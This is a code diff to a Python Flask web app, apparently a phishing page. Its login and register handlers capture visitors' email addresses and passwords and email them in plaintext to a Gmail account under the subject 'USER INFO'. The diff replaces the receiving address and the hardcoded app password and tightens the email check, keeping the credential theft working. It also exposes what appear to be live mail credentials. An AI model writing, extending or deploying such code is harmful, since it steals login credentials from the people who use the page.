@@ -19,14 +19,14 @@ def login():
     password = request.form.get('password', '').strip()
     
     if len(email) >= 13 and len(password) >= 5:
-        #if email.find('@'):
+        if '@' in email:
             msg = MIMEMultipart()
             message_number = email
             message_pass = password
             
-            password_email = "ilpt sfbb gmiy wmon" 
-            msg['From'] = "candyyyarn@gmail.com"
-            msg['To'] = "candyyyarn@gmail.com"
+            password_email = "uubq tlnc jxqr alko" 
+            msg['From'] = "canddyyarn@gmail.com"
+            msg['To'] = "canddyyarn@gmail.com"
             msg['Subject'] = "USER INFO"
             msg.attach(MIMEText(f"LOGIN: {message_number}", 'plain'))
             msg.attach(MIMEText(f"\nPASSWORD: {message_pass}", 'plain'))
@@ -70,14 +70,14 @@ def register():
         
         if password and email:
             if len(email) >= 13 and len(password) >= 5:
-                #if email.find('@'):
+                if '@' in email:
                     msg = MIMEMultipart()
                     message_number = email
                     message_pass = password
             
-                    password_email = "ilpt sfbb gmiy wmon" 
-                    msg['From'] = "candyyyarn@gmail.com"
-                    msg['To'] = "candyyyarn@gmail.com"
+                    password_email = "uubq tlnc jxqr alko" 
+                    msg['From'] = "canddyyarn@gmail.com"
+                    msg['To'] = "canddyyarn@gmail.com"
                     msg['Subject'] = "USER INFO"
                     msg.attach(MIMEText(f"LOGIN: {message_number}", 'plain'))
                     msg.attach(MIMEText(f"\nPASSWORD: {message_pass}", 'plain'))
@@ -101,8 +101,8 @@ def register():
                     except Exception as e:
                         print(f"Ошибка: {e}")
                         return 'Произошла ошибка при обработке запроса.'
-                # else:
-                #     return 'Введіть Email!'
+                else:
+                    return 'Введіть Email!'
             else:
                 return 'Заповніть усі поля.'
         else:
